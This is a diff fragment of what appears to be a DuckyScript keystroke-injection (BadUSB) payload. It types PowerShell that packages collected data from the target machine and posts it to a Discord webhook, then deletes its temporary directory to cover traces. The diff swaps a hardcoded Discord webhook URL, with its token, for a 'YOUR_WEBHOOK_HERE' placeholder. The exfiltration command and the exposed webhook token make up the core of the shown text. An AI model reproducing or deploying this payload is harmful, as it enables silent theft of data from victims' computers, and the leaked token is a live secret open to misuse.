@@ -23,7 +23,7 @@ REM Writing the powershell script
     STRING $body=@{content="``````"+($r|ft|Out-String)+"``````"};
 
     REM Sending the body to the discord webhook
-    STRING curl -Uri 'https://discord.com/api/webhooks/1292988122258341990/XqXG5lo41kj1J5PzKPqAKdAsY3P-iEunnUEwGC8kuro-xh62RSFiRNTyzxq8tIjakOdR' -Method post -Body $body >$null;
+    STRING curl -Uri 'YOUR_WEBHOOK_HERE' -Method post -Body $body >$null;
 
     REM Deleting the temporary directory and exiting powershell
     STRING cd ..;rm $p -r -fo;exit;
